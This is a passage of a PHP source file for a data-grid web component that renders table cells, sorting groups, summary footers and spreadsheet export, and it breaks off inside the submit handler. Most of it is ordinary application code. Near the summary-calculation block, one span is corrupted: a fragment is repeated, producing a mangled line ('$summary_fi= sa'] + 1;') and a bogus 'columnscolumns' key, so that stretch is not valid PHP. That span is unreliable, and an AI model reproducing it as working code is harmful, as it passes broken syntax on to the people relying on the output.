                  if (safe($column, 'image'))
                    $cell->add(new image_href( $href
                                             , (safe($column, 'shared_image')?SHARED_RESOURCES_URL:(safe($column, 'resources_url')?safe($column, 'resources_url'):RESOURCES_URL)).$column['image']
                                             , $attributes));
                  break;      
              }
            }
            break;
          default:
            if (strlen($field_value)) {
              switch ($data_type) {
                case 'date':
                  if (!$db->date_empty($field_value))
                    if ($type != 'friendly_date')
                      $cell->text = strftime_(safe($column, 'format', DISPLAY_DATE_FORMAT), $db->from_date($field_value));
                    else {
                      require_once(dirname(dirname(__FILE__)).'/utils/date_time.php');
                      $date_time = new date_time($db->from_date($field_value));
                      $cell->text = $date_time->as_friendly_string();
                    }
                  break;
                case 'date_time':
                  if (!$db->date_empty($field_value)) {
                    if ($type != 'friendly_date') {
                      $cell->text = strftime_(safe($column, 'format', DISPLAY_DATE_TIME_FORMAT), $db->from_datetime($field_value));
                    } else {
                      require_once(dirname(dirname(__FILE__)).'/utils/date_time.php');
                      $date_time = new date_time($db->from_date($field_value));
                      $cell->text = $date_time->as_friendly_string();
                    }
                  }
                  break;
                case 'real':
                case 'float':
                case 'double':
                  $decimal_digits = safe($column, 'precision', safe($column, 'decimal_digits', 2));
                  $cell->add(new text(number_format(round($field_value, $decimal_digits), $decimal_digits)));
                  break;
                case 'int':
                  if (isset($column['thousands_sep'])) {
                    $tmp_val = number_format($field_value, 0, '', $column['thousands_sep']);
                  } else {
                    $tmp_val = number_format($field_value);
                  }
                  if (safe($column, 'url_field')) {
                    if ($this->field($row, $column['url_field'])) {
                      $url_value = normalize_url($this->field($row, $column['url_field'], false));
                    } else {
                      $url_value = null;
                    }

                    if ($url_value) {
                      if (!safe($column, 'url_in_same_window'))
                        $cell->add(new href( $url_value
                                           , $tmp_val
                                           , array('target' => '_blank'))); 
                      else
                        $cell->add(new href( $url_value
                                           , $tmp_val)); 
                    } else {
                      $cell->add(new text($tmp_val));
                    }
                  } else {
                    $cell->add(new text($tmp_val));
                  }
                  break;
                default:
                  if (safe($column, 'url_field')) {
                    if ($this->field($row, $column['url_field'])) {
                      $url_value = normalize_url($this->field($row, $column['url_field'], false));
                    } else {
                      $url_value = null;
                    }

                    if ($url_value) {
                      if (!safe($column, 'url_in_same_window'))
                        $cell->add(new href( $url_value
                                           , for_html($field_value)
                                           , array('target' => '_blank'))); 
                      else
                        $cell->add(new href( $url_value
                                           , for_html($field_value))); 
                    } else {
                      $cell->add(new text(for_html($field_value))); 
                    }
                  } else
                  if (safe($column, 'email_field')) {
                    $url_value = $this->field($row, $column['email_field'], false);
                    if ($url_value) {
                      $cell->add(new href( 'mailto:'.$url_value
                                         , for_html($field_value))); 
                    } else {
                      $cell->add(new text(for_html($field_value))); 
                    }
                  } else {
                    if (($this->capable('view') || $this->capable('edit') || $this->capable('login_as_user') || $this->capable('login_as_user2') || $this->capable('authorize') || $this->capable('edit_by_click')) and $this->can_update($row)) {
                      if (safe($column, 'as_is')) {
                        $cell_value = for_html($field_value);
                      } 
                      elseif(safe($column, 'no_htmlize')){
                        $cell_value = $field_value;
                      }
                      else {
                        $cell_value = word_sub_str(html_to_text($field_value), 30);
                      }
                    } else
                    if (safe($column, 'as_is')) {
                      $cell_value = for_html($field_value);
                    } else {
                      $cell_value = for_html(html_to_text($field_value));
                    }
                    if (safe($column, 'editable')) {
                      $cell->text = $cell_value;
                    } else {
                      $cell->add(new text($cell_value));
                    }
                  }
              } 
            }  
            break;
        }

        $this->render_tree_column(&$cell, $row, $column_name);
        $this->do_after_render_column(&$cell, $row, $column_name);

        if (!$cell->get_attribute('onclick') && 
            !$cell->contain_class(array('html_a', 'image_href', 'image', 'javascript_image_href', 'input', 'select', 'db_combo', 'db_master_detail_combo', 'button'))) {
          if ($this->is_selector) {          
            $cell->set_attribute('onclick', "__ClosePopup(".$close_popup_refresh.", ".$row[$this->key_field].", '".$close_popup_callback."')");
          } else  
          if ($this->capable('edit_by_click') and $this->can_update($row)) {
            $cell->set_attribute('onclick', $this->js_post_back('brw_edit', $row[$this->key_field]));
          } else 
          if ($this->capable('post_on_click')) {
            $cell->set_attribute('onclick', $this->js_post_back('brw_click', $row[$this->key_field]));
          } else 
          if ($this->capable('click') and $this->get_on_click_script($row)) {
            $cell->set_attribute('onclick', $this->get_on_click_script($row));
          }
        }

        $this->rendered_row['columns'] = $this->rendered_row['columnscolumns'] = $this->rendered_row['columns'] + 1;

        if (safe($column, 'summary') and $this->can_summarize(&$row, $column_name)) {
          if ($summary_fi= sa'] + 1;

        if (safe($column, 'summary') and $this->can_summarize(&$row, $column_name)) {
          if ($summary_fi= safe($column, 'summary_field')) {
            $field_value = $this->field($row, $summary_field);
          }
          $this->summary[$column_name]['sum']     = safe(safe($this->summary, $column_name), 'sum', 0) + $field_value;
          $this->summary[$column_name]['count']   = safe(safe($this->summary, $column_name), 'count') + 1;
          $this->summary[$column_name]['avg']     = $this->summary[$column_name]['sum']/$this->summary[$column_name]['count'];
          if ($field_value > safe($this->summary[$column_name], 'max', 0)) {
            $this->summary[$column_name]['max']   = $field_value;
          }
          if ($field_value < safe($this->summary[$column_name], 'min', 9999999999)) {
            $this->summary[$column_name]['min']   = $field_value;
          }
        }
          
        //$this->do_before_finalyze_cell(&$cell, $row);
        
        if (safe($column, 'editable')) { 
          $id = 'cell_'.$row[$this->key_field].'_'.$column['name'];
          $cell->set_id($id);
        }

        $table_row->add($cell);

        /*
          Template for editable must be like this. For example:
          <div>
          <textarea style="width:100%; height:100%;" id="{$field.id}_" name="{$field.id}_">{$field.content}</textarea>
          </div>
          <div>
          <input id="{$field.id}_old" name="{$field.id}_old" type="hidden" value="">
          <input id="{$field.id}_save" name="{$field.id}_save" type="button" class="editable_save" value="Save">
          <input id="{$field.id}_cancel" name="{$field.id}_cancel" type="button" class="editable_cancel" value="Cancel">
          </div>
          Pay attention that this is not a smarty template and constructions like {foreach}{/foreach} {if}{/if} etc. doesnt' work  
        */
          
        if (safe($column, 'editable')){
          $template = safe($column, 'template') ? file_get_contents(TEMPLATES_PATH . safe($column, 'template')) : '';
          $template = str_replace('"', '\"', $template);
          $template = preg_replace("/\r?\n/si", '\n', $template);

          $table_row->add(new script('$("#'.$id.'").editableByClick({' . 
                                     'ajaxMethod: "' . $this->ajax_method_save_value . '", ' . 
                                     'recordId: "'.$row[$this->key_field].'", '.
                                     'fieldName: "'.$column['name'].'", '.
                                     'tableName: "'.safe($column, 'editable', '').'", '.
                                     'autosave: "'.safe($column, 'autosave', '').'", '.
                                     'type: "'.safe($column, 'type', '').'", '.
                                     'template: "' . $template .
                                     '"}); '));
        }
      }
    }

    if ($this->capable('delete')) {
      if (($row[$this->key_field] > 0) && $this->can_delete($row)) {
        $name = safe($row, $this->name_field);
        if ($name)
          $confirmation = sprintf(trn('Are you sure you want to delete "%s"?'), $name);
        else  
          $confirmation = trn('Are you sure you want to delete this record?');
        $table_row->add(new table_cell( array( 'class'  => 'button')                                 
                                      , new javascript_image_href( $this->js_post_back( 'brw_delete'
                                                                                      , $db->encrypt_key($this->translate_key_for('delete', $row))
                                                                                      , for_javascript($confirmation)
                                                                                      )
                                                                 , SHARED_RESOURCES_URL.'img_delete.gif'
                                                                 , array( 'title' => trn('Delete')
                                                                        ))));
      } else
        $table_row->add(new table_cell());
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }
    
    if ($this->capable("record_details")) {
      global $jsox;
      $onclick = $jsox->generate_call( array( "method"     => "get_record_details"
                                            , "callback"   => "show_record_details"
                                            , "identifier" => $row[$this->key_field]
                                            , "quote"      => "'"
                                            )
                                     , get_class($this)
                                     , $row[$this->key_field]
                                     , $this->context_id('record_details')
                                     );
      if ($onselectrow = $this->get_on_select_row_script($row)) {
        $onclick .= ';'.$onselectrow;
      }
      $table_row->set_attribute('onselectrow', $onclick);
    } else
    if ($onselectrow = $this->get_on_select_row_script($row))
      $table_row->set_attribute('onselectrow', $onselectrow);
    
    if ($this->capable("record_hint")) {
      $table_row->set_attribute('gid', $row[$this->key_field]);
      $table_row->set_attribute('grh', 'true');
    } else
    if ($this->capable("record_details")) {
      global $jsox;
      $onclick = $jsox->generate_call( array("method"     => "get_record_details"
                                            ,"callback"   => "show_record_details"
                                            ,"identifier" => $row[$this->key_field]
                                            ,"quote"      => "'"
                                            )
                                     , get_class($this)
                                     , $row[$this->key_field]
                                     , $this->context_id('record_details')
                                     );
      if ($onselectrow = $this->get_on_select_row_script($row)) {
        $onclick .= ';'.$onselectrow;
      }
      $table_row->set_attribute('onclick', $onclick);
    }

    $this->do_before_finalyze_row(&$table_row, $row);
    
    if (($this->scroll_mode == BROWSER_SCROLL_SESSION_POINTER) and ($row[$this->key_field] == get_browser_record_pointer($this->table))) {
      $table_row->add(new script("var c=document.getElementById('".$table_row->id()."');if (c) c.scrollIntoView(true);"));
      $table_row->set_attribute('class', 'selected');
      if (!$this->persistent_record_pointer)
        move_browser_record_pointer($this->table);
      if ($onselectrow = $this->get_on_select_row_script($row)) {
        $this->add(new script('window.setTimeout("'.$onselectrow.'", 1);'));
        $this->__record_selection_scheduled = true;
      } else
      if ($this->capable("record_details")) {
        global $jsox;
        $get_details = $jsox->generate_call( array( "method"     => "get_record_details"
                                                  , "callback"   => "show_record_details"
                                                  , "identifier" => $row[$this->key_field]
                                                  , "quote"      => "'"
                                                  )
                                           , get_class($this)
                                           , $row[$this->key_field]
                                           , $this->context_id('record_details')
                                           );
        if ($onselectrow = $this->get_on_select_row_script($row)) {
          $get_details .= ';'.$onselectrow;
        }
        $this->add(new script('window.setTimeout("'.$get_details.'", 1);'));
        $this->__record_selection_scheduled = true;
      }
    }
    if (($this->scroll_mode == BROWSER_SCROLL_TOP) and ($num == 0))
      $table_row->add(new script("var c=document.getElementById('".$table_row->id()."');if (c) c.scrollIntoView(true);"));

    if ($this->capable('sort')) {
      // group
      $group_level = 0;
      foreach ($this->columns as $column) {
        if (safe($column, 'sortable') and safe($column, 'group_on_sort') and !$this->tree_level) {
          $column_name = $column['name'];
          $order = $this->order($column_name); 
          if ($order) {   
            $field_name = safe($column, 'group_field', safe($column, 'sort_field', safe($column, 'field'))); 
            $field_name = preg_replace('~.+[.]~', '', $field_name);
            if ($field_name) {
              $type = safe($column, 'type', 'text'); 
              $data_type = safe($column, 'data_type', safe(safe($defs, $field_name), 'type', 'text'));
              $field_value = $this->field($row, $field_name);
              $render_group = false;
              $group_header = trn(safe($column, 'group_header', safe($column, 'header'))).': ';
              switch($data_type) {
                case "date_time":
                case "date":
                  if (!$db->date_empty($field_value)) {
                    require_once(GENERIC_PATH.'utils/date_time.php');
                    switch($data_type) {
                      case "date_time":
                        $date = new date_time($db->from_datetime($field_value));
                        break;
                      case "date":
                        $date = new date_time($db->from_date($field_value));
                        break;
                    }
                    if (safe($this->__group_values, $column_name) != $date->as_friendly_string()) {
                      $this->__group_values[$column_name] = $date->as_friendly_string();
                      $after = false;
                      foreach($this->__group_values as $name => $value) {
                        if ($name == $column_name) {
                          $after = true;
                        } else 
                        if ($after) {
                          $this->__group_values[$name] = null;
                        }
                      }
                      $render_group = true;
                    }
                  } else {
                    $field_value = safe($column, 'empty_group_label', trn('Empty'));
                    if (safe($this->__group_values, $column_name) != $field_value) {
                      $this->__group_values[$column_name] = $field_value;
                      $after = false;
                      foreach($this->__group_values as $name => $value) {
                        if ($name == $column_name) {
                          $after = true;
                        } else 
                        if ($after) {
                          $this->__group_values[$name] = null;
                        }
                      }
                      $render_group = true;
                    }
                  }
                  break;
                default:
                  if (!$field_value) {
                    $field_value = safe($column, 'empty_group_label', trn('Empty'));
                  }
                  if (safe($this->__group_values, $column_name) != $field_value) {
                    $this->__group_values[$column_name] = $field_value;
                    $after = false;
                    foreach($this->__group_values as $name => $value) {
                      if ($name == $column_name) {
                        $after = true;
                      } else 
                      if ($after) {
                        $this->__group_values[$name] = null;
                      }
                    }
                    $render_group = true;
                  }
                  break;
              }

              if (safe($column, 'hide_group_prefix'))
                $group_header = '';

              if ($render_group) {
                $ot = new table(array( 'cellspacing' => 0
                                     , 'class'       => 'group'
                                     ));

                $otr = new table_row();
                $otr->add(new table_cell(str_repeat('&nbsp;', $group_level*3).$group_header.$this->__group_values[$column_name], array('rowspan' => 2)));
                  
                if ($order == 'ASC') 
                  $otr->add(new table_cell( array('valign' => 'bottom')
                                            , new image( SHARED_RESOURCES_URL.'img_sort_asc_sorted.gif'
                                                       , array( 'alt'   => sprintf(trn('Sort by field [%s], ascending'), addslashes(safe($column, 'header')))))));
                else   
                  $otr->add(new table_cell( array('valign' => 'bottom')
                                          , new javascript_image_href( $this->js_post_back('brw_order_asc', $column['name'])
                                                                     , SHARED_RESOURCES_URL.'img_sort_asc.gif'
                                                                     , array( 'alt'   => sprintf(trn('Sort by field [%s], ascending'), addslashes(safe($column, 'header')))))));

                if ($order) {
                  $otr->add(new table_cell( array('rowspan' => 2)
                                          , new javascript_image_href( $this->js_post_back('brw_order_clear', $column['name'])
                                                                     , SHARED_RESOURCES_URL.'img_sort_none.gif'
                                                                     , array( 'alt' => sprintf(trn('Cancel sorting by field [%s]'), addslashes(safe($column, 'header')))
                                                                     ))));
                }

                $ot->add($otr); 
                
                if ($order == 'DESC') 
                  $ot->add(new table_row(new table_cell(array('valign' => 'top')
                                            , new image( SHARED_RESOURCES_URL.'img_sort_desc_sorted.gif'
                                                       , array( 'alt'   => sprintf(trn('Sort by field [%s], descending'), addslashes(safe($column, 'header'))))))));
                else   
                  $ot->add(new table_row(new table_cell( array('valign' => 'top')
                                                         , new javascript_image_href( $this->js_post_back('brw_order_desc', $column['name'])
                                                                                    , SHARED_RESOURCES_URL.'img_sort_desc.gif'
                                                                                    , array( 'alt'   => sprintf(trn('Sort by field [%s], descending'), addslashes(safe($column, 'header'))))))));
                
                $grid_table->add(new table_row( array('class' => 'group') 
                                              , new table_cell( array('colspan' => $this->rendered_row['columns'])
                                                              , $ot)));
              }
            }
            $group_level++;
          }
        }
      }
    }
      
    $this->do_before_add_row(&$grid_table, &$table_row, $row);

    $grid_table->add($table_row);

  }
  
  function render_footer($grid_table) {

    global $auth, $db;

    $row = new table_row(array('class' => 'footer'));
    
    $columns = 0;
    if ($this->capable('select'))
      $columns++;
    if ($this->capable('select_one'))
      $columns++;
    if ($this->capable('view'))
      $columns++;
    if ($this->capable('edit'))
      $columns++;
    if ($this->capable('copy'))
      $columns++;

    if ($columns > 0)
      $row->add(new table_header(array('colspan' => $columns)));

    $value_columns = false;
      
    foreach ($this->columns as $column) {

      if ($this->is_column_visible($column)) {

        $column_name = $column['name']; 

        if (safe($column, 'summary')) {

          if ($summary_field = safe($column, "summary_field"))
            $data_type = safe($column, 'data_type', safe(safe($this->field_defs, $summary_field), 'type', 'text'));
          else
          if ($this->is_field_column($column)) 
            $data_type = safe($column, 'data_type', safe(safe($this->field_defs, $column_name), 'type', 'text'));
          else  
            $data_type = safe($column, 'data_type', 'text');

          $summary_value = ''; 
          $summary_types = explode(',', $column['summary']);

          foreach($summary_types as $summary_type) {
            
            switch ($summary_type) {
              case 'count':
                $data_type = 'int';
                break;
              case 'avg':
                $data_type = 'real';
                break;
            }
              
            $value = safe(safe($this->summary, $column_name), $summary_type);
            
            if (strlen($value)) {
              switch ($data_type) {
                case 'real':
                case 'float':
                case 'double':
                  $decimal_digits = safe($column, 'precision', safe($column, 'decimal_digits', 2));
                  $value = number_format(round($value, $decimal_digits), $decimal_digits);
                  break;
                case 'int':
                  $value = number_format($value);
                  break;
                case 'date_time':
                  $value = strftime_(safe($column, 'format', DISPLAY_DATE_TIME_FORMAT), $db->from_datetime($value));
                  break;
                case 'date':
                  $value = strftime_(safe($column, 'format', DISPLAY_DATE_FORMAT), $db->from_date($value));
                  break;
                case 'time':
                  break;
              }
            }

            if (strlen($value)) {
              if (count($summary_types) > 1) {
                if ($summary_value)
                  $summary_value .= '<br>';
                $summary_value .= $summary_type.'=';
              } else 
              if (safe($column, 'show_summary_type') || ($summary_type != 'sum'))
                $summary_value .= $summary_type.'=';
              $summary_value .= safe($column, 'summary_prefix').$value.safe($column, 'summary_postfix');
            }

            
          }
          $row->add(new table_header( array('align' => safe($column, 'align', 'right'))
                                    , $summary_value
                                    ));
          $value_columns = true;                            
        } else
          $row->add(new table_header());
      }

    }

    if ($this->capable('delete'))
      $row->add(new table_header());

    $row->set_id($this->context_id("footer"));
    if ($this->scroll_mode == BROWSER_SCROLL_BOTTOM)
      $row->add(new script("var c=document.getElementById('".$row->id()."');if (c) c.scrollIntoView(true);"));

    if ($value_columns)  
      $grid_table->add($row);

  }

  function can_summarize($row, $name) { return true; }
  function can_update($row) { return true; }
  function can_copy($row) { return true; }
  function can_view($row) { return true; }
  function can_delete($row) { return true; }
  function can_select($row) { return true; }

  function can_button($row, $name) {
    global $db;
    switch ($name) {
      case 'move_up':
        $sql = placeholder( 'SELECT 1 FROM '.$this->table.' WHERE '.$this->order_field.' < ? AND '.$this->key_field.' != ?'
                          , $row[$this->order_field]
                          , $row[$this->key_field]
                          );

        if ($this->work_mode == 'tree')
          if ($row[$this->parent_field])
            $sql .= placeholder(' AND '.$this->parent_field.' = ?', $row[$this->parent_field]);
          else  
            $sql .= ' AND '.$this->parent_field.' IS NULL';

        if ($db->value($sql))
          return true;
        break;
      case 'move_down':
        $sql = placeholder( 'SELECT 1 FROM '.$this->table.' WHERE '.$this->order_field.' > ? AND '.$this->key_field.' != ?'
                          , $row[$this->order_field]
                          , $row[$this->key_field]
                          );
        if ($this->work_mode == 'tree')
          if ($row[$this->parent_field])
            $sql .= placeholder(' AND '.$this->parent_field.' = ?', $row[$this->parent_field]);
          else  
            $sql .= ' AND '.$this->parent_field.' IS NULL';
        if ($db->value($sql))
          return true;
        break;  
      default:
        return true;
    }
    
  }
  
  function do_render_custom_column($cell, $row, $name) { }
  function do_draw_column_footer($name) { return ''; }
  function do_before_render_column($cell, $row, $name) { }
  function do_after_render_column($cell, $row, $name) { }
  function do_export_custom_column($row, $name) { return ''; }

  function do_before_render_grid($grid_table) { }
  function do_before_render_row($grid_table, $row) { }
  function do_after_render_row($grid_table, $row) { }
  function do_after_render_grid($grid_table) { }
  function do_after_render_footer($grid_table) { }

  function do_before_export_row($row) { return ''; }
  function do_after_export_row($row) { return ''; }

  function do_before_finalyze_row ($grid_row, $row) { }
  function do_before_add_row ($grid_table, $grid_row, $row) { }

  function do_get_first_row() { return null; }

  function add_column($column) { 

    //global $BROWSER_COLUMN_DEF;
    //check_params_against($column, $BROWSER_COLUMN_DEF);
    
    if (!isset($column['name']) and isset($column['field']))
      $column['name'] = $column['field'];
      
    if (safe($column, 'summary') === true) {
      $column['summary'] = 'sum';
    }
      
    array_push($this->columns, $column); 
    
    if (safe($column, 'default_order') and !$this->order_exists($column['name']))
      $this->set_order($column['name'], safe($column, 'default_order'));
      
    if (safe($column, 'editable')) {
      $this->editable_columns++;
    }

  }

  function add_header($header) { 

    //global $BROWSER_HEADER_DEF;
    //check_params_against($header, $BROWSER_HEADER_DEF);

    array_push($this->headers, $header); 

  }

  function do_before_add_capability($capability, $options = array()) { 
    
    switch ($capability) {
      case "insert":
        return !$this->read_only();
      case "delete":
        return !$this->read_only();
      case "edit":
        return !$this->read_only();
      case "delete_selected":
        return !$this->read_only();
      case "select":
        return !$this->read_only();
      case "select_one":
        return !$this->read_only();
      case "select_all":
        return !$this->read_only();
      default:
        return true;
    }
    
  }
  
  function do_after_add_capability($capability, $options = array()) {
      
    parent::do_after_add_capability($capability, $options);
      
    switch ($capability) { 
      case "change_order":
        $this->add_column(array ( "type"                   => "button"
                                , "name"                   => "move_down"
                                , "title"                  => "Move item down"
                                , "image"                  => "img_move_down.gif"
                                , "action"                 => "post_back"
                                , "post_back_event_name"   => "move_down"
                                , "post_back_event_value"  => PLACEHOLDER_KEY
                                , 'hint'                   => "Press this button to move record down"
                                , "shared_image"           => true
                                ));
        $this->add_column(array ( "type"                   => "button"
                                , "name"                   => "move_up"
                                , "title"                  => "Move item up"
                                , "image"                  => "img_move_up.gif"
                                , "action"                 => "post_back"
                                , "post_back_event_name"   => "move_up"
                                , "post_back_event_value"  => PLACEHOLDER_KEY
                                , 'hint'                   => "Press this button to move record up"
                                , "shared_image"           => true
                                ));
        break;
      case "merge":
        $this->add_capability("select_all");
        $this->add_button(array ( "value" => trn("Merge")
                                , "image" => "img_merge.gif"
                                , "type"  => "javascript"
                                , "href"  => $this->js_post_back_with_reason("merge", null, trn('Please enter name for target record. WARNING!!! All records will be linked to first selected record.'))
                                ));
        break;
      case "delete_selected":
        $this->add_capability("select_all");
        break;
      case "select_all":
        $this->add_capability("select");
        break;
    }
    
  }
  
  function export_header() {

    $col = 0;
    
    if (count($this->headers) > 0) {
      foreach($this->headers as $header) {
        if (safe($header, 'colspan', 1) == 1) {
          if (!safe($header, 'title')) {
            $this->worksheet->setMerge($this->export_row_num, $col, $this->export_row_num + 1, $col + safe($header, 'colspan', 1) - 1);
            $this->worksheet->write($this->export_row_num, $col, safe($this->columns[$col], 'header'), $this->export_formats['header']);
          } else {
            $this->worksheet->write($this->export_row_num,     $col, safe($header, 'title'), $this->export_formats['header']);
            $this->worksheet->write($this->export_row_num + 1, $col, safe($this->columns[$col], 'header'), $this->export_formats['header']);
          }
          $col++;
        } else {
          $this->worksheet->setMerge($this->export_row_num, $col, $this->export_row_num, $col + safe($header, 'colspan', 1) - 1);
          $this->worksheet->write($this->export_row_num, $col, safe($header, 'title'), $this->export_formats['header']);
          for($i = 0; $i < safe($header, 'colspan'); $i++) {
            $this->worksheet->write($this->export_row_num + 1, $col, safe($this->columns[$col], 'header'), $this->export_formats['header']);
            $col++;
          }
        }
      }
      $this->export_row_num++;
      $this->export_row_num++;
    } else {
      foreach($this->columns as $column) {
        if ($this->is_column_exportable($column)) {
          $this->worksheet->write($this->export_row_num, $col, safe($column, 'header'), $this->export_formats['header']);
          $col++;
        }
      }
      $this->export_row_num++;
    }

    $this->export_first_row_num = $this->export_row_num + 1;
    
  }

  function export_body() {

     global $db;
     
     $sql = $this->sql();
     if ($this->items_limit && !$this->manual_items_limit) {
       $sql = $db->limit($sql, 0, $this->items_limit);
     }
     return $this->export_body_by_sql($sql);

  }

  function export_body_by_sql($sql) {

    global $db;
    
    $this->do_before_export_body();
    $query = $db->query($sql);
    $this->field_defs = $db->field_defs($query);
    if ($row = $this->do_get_first_row()) {
      $this->do_before_export_row($row);
      $this->export_row($row, $this->field_defs);
      $this->do_after_export_row($row);
    }
    while ($row = $db->next_row($query)) {
      if ($this->can_render_row($row)) {
        $this->do_before_export_row($row);
        $this->export_row($row, $this->field_defs);
        $this->do_after_export_row($row);
        $this->rows_rendered++;
      }
      if ($this->items_limit && $this->manual_items_limit && ($this->rows_rendered == $this->items_limit)) {
        break;
      }
    }
    $this->do_after_export_body();

  }

  function export_row($row, $defs) {

    global $db;

    $this->rendered_row = array();
    $this->rendered_row['columns'] = 0;

    $col = 0;

    foreach($this->columns as $column) {

      if ($this->is_column_exportable($column)) {

        $type      = safe($column, 'type', 'text'); 

        if ($this->is_field_column($column)) {
          $column_name = $column['field'];
          $data_type = safe(safe($defs, $column_name), 'type', 'text');
          $field_value = $this->field($row, $column_name);
        } else {
          $column_name = $column['name'];
          $field_value = $this->do_fill_field($row, $column_name);
        }
          
        $value = $field_value;  

        if (strlen($field_value) || ($type == 'custom')) {  
          switch ($type) {
            case 'custom':
              $value = $this->do_export_custom_column($row, $column_name);
              break;
            case 'image':
              break;
            case 'yesno':
            case 'yesnoimage':
            case 'checkbox':
              break;
            case 'currency':
              $decimal_digits = safe($column, 'precision', safe($column, 'decimal_digits', 2));
              $value = str_replace('.', ',', number_format($field_value, $decimal_digits));
              break;
            case 'check_list':
              $sql = 'SELECT a.name'.
                     '  FROM '.$column['check_list_table'].' a'.
                     '     , '.$column['check_list_link_table'].' b'.
                     ' WHERE b.'.$column['check_list_link_fk_field'].' = a.id'.
                     '   AND b.'.$column['check_list_link_pk_field'].' = '.$row[$this->key_field];
              global $db;
              if ($list_query = $db->query($sql)) {
                $column_value = '';
                while ($list_row = $db->next_row($list_query)) 
                  $column_value .= ($column_value?', ':'').$list_row['name']; 
                $content .= $column_value;
              }
              $value = $content;
              break;
            case 'html':
              $value = $field_value;
              break;
            case 'button':
              break;
            default: 
              switch ($data_type) {  
                case 'real':    
                case 'float':    
                case 'double':    
                  $value = round($field_value, safe($column, 'precision', 2));
                  $value = str_replace('.', ',', $value);//round($field_value, safe($column, 'precision', 2)));
                  break;
                case 'date':
                  if (!$db->date_empty($field_value))
                    $value = strftime_(safe($column, 'format', EXPORT_DATE_FORMAT), $db->from_date($field_value));
                  break;
                case 'date_time':
                  if (!$db->date_empty($field_value))
                    $value = strftime_(safe($column, 'format', DISPLAY_DATE_TIME_FORMAT), $db->from_datetime($field_value));
                  break;
                case 'int':
                  $value = $field_value;
                  break;
                default:
                  $value = $field_value;  
                  break;
              }
          }
        }  

        $value = (is_html($field_value)?html_to_text($value):$value);
        
        $this->worksheet->write($this->export_row_num, $col, $value);
        $col++;
        
        $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;

        if (safe($column, 'summary') and $this->can_summarize(&$row, $column_name)) {
          if ($summary_field = safe($column, 'summary_field')) {
            $field_value = $this->field($row, $summary_field);
          }
          $this->summary[$column_name]['sum']     = safe(safe($this->summary, $column_name), 'sum', 0) + $field_value;
          $this->summary[$column_name]['count']   = safe(safe($this->summary, $column_name), 'count') + 1;
          $this->summary[$column_name]['avg']     = $this->summary[$column_name]['sum']/$this->summary[$column_name]['count'];
          if ($field_value > safe($this->summary[$column_name], 'max', 0)) {
            $this->summary[$column_name]['max']   = $field_value;
          }
          if ($field_value < safe($this->summary[$column_name], 'min', 9999999999)) {
            $this->summary[$column_name]['min']   = $field_value;
          }
        }
        
      }
    }
    
    $this->export_row_num++;
    $this->export_last_row_num = $this->export_row_num;

  }

  function export_footer($delimiter = ',') {

    $col = 0;
    
    foreach($this->columns as $column) {
      if ($this->is_column_exportable($column)) {
        $column_name = $column['name']; 
        if (safe($column, 'summary') and $this->can_summarize(&$row, $column_name)) {
          $this->worksheet->writeFormula($this->export_row_num, $col, "=SUM(".chr(ord('A') + $col).$this->export_first_row_num.":".chr(ord('A') + $col).$this->export_last_row_num.")");
        } else {
          $this->worksheet->write($this->export_row_num, $col, '');
        }
        $col++;
      }
    }
    
    $this->export_row_num++;

  }

  function do_export() {

    $this->start_timer();

    $this->sql = $this->get_prepared_sql($this->sql());
      
    $this->export_header();
    $this->export_body();
    $this->export_footer();
    
  }

  function do_config_button(&$button, $row) {

  }
  
  function is_column_visible($column) {
    
    if (safe($column, 'group_on_sort') and $this->order($column['name']) and safe($column, 'hide_when_grouped'))
      return false;
    else
      return !safe($column, 'hidden');
    
  }
  
  function is_column_exportable($column) {
    
    return $this->is_column_visible($column) && !safe($column, 'not_exportable');
    
  }
  
  function is_field_column($column) {
    
    return (safe($column, 'field'));
    
  }
  
  function set_order($name, $direction) {

    $browser_configuration = $this->browser_configuration();
    $browser_configuration->set_order($name, $direction);

  }

  function save_order($event_value, $direction) {

    if ($event_value) {
      if (!$this->capable('multiple_sorting'))
        foreach ($this->columns as $column) 
          if (safe($column, 'sortable')) 
            $this->clear_order($column['name']); 
      $this->set_order($event_value, $direction); 
    }

  }

  function apply_order($sql) {

    $error = '';
    $order_sql = '';
    if ($this->capable('sort'))
      foreach ($this->columns as $column) {
        if (safe($column, 'sortable')) {
          $value = $this->order($column['name']);
          if ($value) {
            $order = safe($column, 'sort_field', safe($column, 'field'));
            if ($order)
              $order_sql = incs($order_sql, $order.' '.$value, ', ');
          }
        }
      }
    if ($order_sql)
      return str_replace('/*order*/', ' ORDER BY '.$order_sql, $sql);
    else
      return str_replace('/*order*/', '', $sql);

  }
  
  
/**
 * Re-calculate order if there are items with the same order
 */
  function check_current_order_duplicates($item_id) {
    global $db;
    
    $curl        = $db->row ('SELECT * FROM '.$this->table.' WHERE '.$this->key_field.' = ?', $item_id); 
    $parent_sql  = '';
    if ($this->work_mode == 'tree')
      if ($curl[$this->parent_field])
        $parent_sql = placeholder(' AND '.$this->parent_field.' = ?', $curl[$this->parent_field]);
      else  
        $parent_sql = ' AND '.$this->parent_field.' IS NULL';
    $same_sql    = 'SELECT * FROM '.$this->table.' WHERE '.$this->order_field.' = ?'.$parent_sql;
    $same_orders = $db->rows($same_sql, $curl[$this->order_field]);
    if (count($same_orders) > 1) {
      foreach($same_orders as $curl) {
        $curl = $db->row('SELECT * FROM '.$this->table.' WHERE '.$this->key_field.' = ?', $curl["id"]);
        $same_sql = 'SELECT * FROM '.$this->table.' WHERE '.$this->order_field.' = ? AND '.$this->key_field.' <> ?'.$parent_sql;  
        if (!$db->value($same_sql, $curl[$this->order_field], $curl['id'])) {
          break;
        }
        $update_sql = 'UPDATE '.$this->table.' SET '.$this->order_field.' = '.$this->order_field.' + 1 WHERE '.$this->order_field.' >= ? AND '.$this->key_field.' <> ?'.$parent_sql;
        $db->query($update_sql, $curl[$this->order_field], $curl['id']);
      }
    }

  }  

  function handle_submit() {

    $result = parent::handle_submit(); 
    
    $sender_name = $this->context_post(POST_PARAM_SENDER_NAME);
    $event_name  = $this->context_post(POST_PARAM_EVENT_NAME);
    $event_value = $this->context_post(POST_PARAM_EVENT_VALUE);

    if (!$result and $event_name and ($sender_name == $this->id())) {
      
      switch ($event_name) {
        case 'brw_order_asc':
          $this->save_order($event_value, 'ASC');
          $this->submit_handled(); 
          return true;
        case 'brw_order_desc':
          $this->save_order($event_value, 'DESC');
          $this->submit_handled(); 
          return true;
        case 'brw_order_clear':
          $this->clear_order($event_value);
          $this->submit_handled(); 
          return true;
      }

    }
    
    if ($this->work_mode == 'tree') {
      switch ($event_name) {
        case "expand":
